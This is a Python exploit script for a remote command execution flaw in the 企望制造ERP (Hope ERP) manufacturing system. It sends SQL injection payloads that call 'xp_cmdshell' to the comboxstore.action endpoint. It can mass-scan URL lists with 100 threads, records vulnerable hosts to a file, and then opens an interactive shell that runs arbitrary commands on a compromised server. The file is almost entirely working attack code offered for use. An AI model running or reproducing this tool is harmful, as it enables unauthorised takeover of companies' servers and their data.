#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
██╗  ██╗ ██████╗ ██████╗ ███████╗    ███████╗██████╗ ██████╗ 
██║  ██║██╔═══██╗██╔══██╗██╔════╝    ██╔════╝██╔══██╗██╔══██╗
███████║██║   ██║██████╔╝█████╗      █████╗  ██████╔╝██████╔╝
██╔══██║██║   ██║██╔═══╝ ██╔══╝      ██╔══╝  ██╔══██╗██╔═══╝ 
██║  ██║╚██████╔╝██║     ███████╗    ███████╗██║  ██║██║     
╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝                                                                
                            tag:  企望制造ERP系统 RCE                                       
                                @version: 1.0.0   @author by gallopsec            
"""
    print(test)
headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
def poc(target):
    url = target+"/mainFunctions/comboxstore.action"
    try:
        data = {"comboxsql": f"exec xp_cmdshell 'whoami'"}
        res = requests.post(url,headers=headers,data=data,timeout=5,verify=False).text
        if '"Value"' in res:
            print(f"[+] {target} is vulable")
            with open("request.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] {target} is not vulable")
            return False
    except:
        print(f"[*] {target} error")
        return False
def exp(target):
    os.system("cls")
    while True:
        cmd = input("请输入你要执行的命令(q--->quit)\n>>>")
        if cmd == "q":
            exit()
        url = target + "/mainFunctions/comboxstore.action"
        data = {"comboxsql": f"exec xp_cmdshell '{cmd}'"}
        try:
            rep = requests.post(url,headers=headers,data=data,verify=False,timeout=5).text
            result = re.findall('''Value":"(.*?)"''',rep,re.S)[0]
            print(result)
        except:
            print("执行异常,请重新执行其它命令")

def main():
    banner()
    parser = argparse.ArgumentParser(description='Hope_Erp RCE EXP')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
